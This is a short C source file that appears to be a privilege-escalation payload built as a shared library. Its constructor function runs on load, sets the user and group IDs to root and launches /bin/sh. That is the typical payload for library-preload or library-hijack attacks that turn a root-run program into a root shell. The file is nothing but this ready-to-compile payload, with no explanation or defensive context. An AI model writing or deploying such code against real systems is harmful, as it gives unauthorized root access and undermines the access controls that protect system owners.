#include <unistd.h>
#include <stdlib.h>

static void __attribute__ ((constructor)) _init(void);

static void _init(void)
{
	int status;	
	status = setuid(0);
	status = setgid(0);
	static char *a_argv[] = {"sh", NULL};
	execv("/bin/sh", a_argv);
	exit(0);
}



